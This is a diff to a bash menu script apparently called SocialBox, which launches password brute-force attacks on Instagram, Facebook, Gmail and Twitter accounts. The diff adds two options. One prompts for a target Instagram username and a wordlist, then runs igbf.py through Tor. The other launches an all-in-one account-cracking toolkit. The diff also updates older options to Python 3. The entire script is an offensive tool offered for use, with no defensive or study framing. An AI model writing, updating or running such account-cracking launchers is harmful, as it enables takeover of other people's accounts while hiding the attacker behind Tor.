@@ -42,6 +42,8 @@ echo -e "		$Cyan 3 : Brute Force Instagram Account 1$nc"
 echo -e "		$Cyan 4 : Brute Force Twitter Account$nc"
 echo -e "		$Cyan 5 : Brute Force Instagram Account 2 $nc"
 echo -e "		$Cyan 6 : Brute Force Facebook Account 2$nc"
+echo -e "		$Cyan 7 : Brute Force Instagram Account 3 (igbf - modern)$nc"
+echo -e "		$Cyan 8 : Modern All-in-One (sosec - Instagram/Facebook/Gmail/Twitter)$nc"
 echo -e "		$Cyan 99: Exit$nc"
 read -p "Choice >  " ch
 if [ $ch = 1 ]; then
@@ -72,7 +74,7 @@ fi
 elif [ $ch = 2 ]; then
 echo -e "			$Cyan Gmail Brute Force$nc"
 cd Gemail-Hack
-python2 gemailhack.py
+python3 gemailhack.py
 echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
 echo -e "$red"
 read -p "Wanna Back To Main Menu [ Y / n ] : " check2
@@ -151,7 +153,7 @@ sleep 0.025
         echo -e "	[+]$red Service Tor Started $nc[+]"
 sleep 0.9
 sv tor start
-python instabf.py
+python3 instabf.py
 echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
 sv tor stop
 echo -e "		[+]$red Service Tor Stopped$nc [+]"
@@ -178,7 +180,8 @@ sleep 0.025
         echo -e "	[+]$red Service Tor Started $nc[+]"
 sleep 0.9
 sv tor start
-python2 fikrado.py
+echo -e "$yellow Warning: fikrado.py requires Python 2 (not available in modern Termux). Trying python3...$nc"
+python3 fikrado.py 2>/dev/null || echo -e "$red Error: fikrado.py is not Python 3 compatible. Install python2 from external repo or skip this option.$nc"
 echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
 sv tor stop
 echo -e "		[+]$red Service Tor Stopped$nc [+]"
@@ -194,6 +197,60 @@ cd .. && bash SocialBox.sh
 elif [ $check5 = "yes" ]; then
 cd .. && bash SocialBox.sh
 elif [ $check5 = "YES" ]; then
+cd .. && bash SocialBox.sh
+else
+exit 1
+fi
+elif [ $ch = 7 ]; then
+echo -e "			$Cyan Instagram Brute Force 3 (igbf)$nc"
+cd igbf/
+sleep 0.025
+echo -e "	[+]$red Service Tor Started $nc[+]"
+sleep 0.9
+sv tor start
+echo -e "$green"
+read -p "Enter Instagram username: " user
+read -p "Enter wordlist path: " wordlist
+echo -e "$nc"
+python3 igbf.py -u "$user" -w "$wordlist" -v
+echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
+sv tor stop
+echo -e "		[+]$red Service Tor Stopped$nc [+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check7
+echo -e "$nc"
+if [ $check7 = "Y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check7 = "y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check7 = "Yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check7 = "yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check7 = "YES" ]; then
+cd .. && bash SocialBox.sh
+else
+exit 1
+fi
+elif [ $ch = 8 ]; then
+echo -e "			$Cyan Modern All-in-One (sosec)$nc"
+cd sosec/
+sleep 0.025
+echo -e "	[+]$red Starting Modern Toolkit$nc"
+python3 sosec.py
+echo -e "               [+]$yellow Toolkit Complete $nc[$green✓$nc] $nc[+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check8
+echo -e "$nc"
+if [ $check8 = "Y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check8 = "y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check8 = "Yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check8 = "yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check8 = "YES" ]; then
 cd .. && bash SocialBox.sh
 else
 exit 1
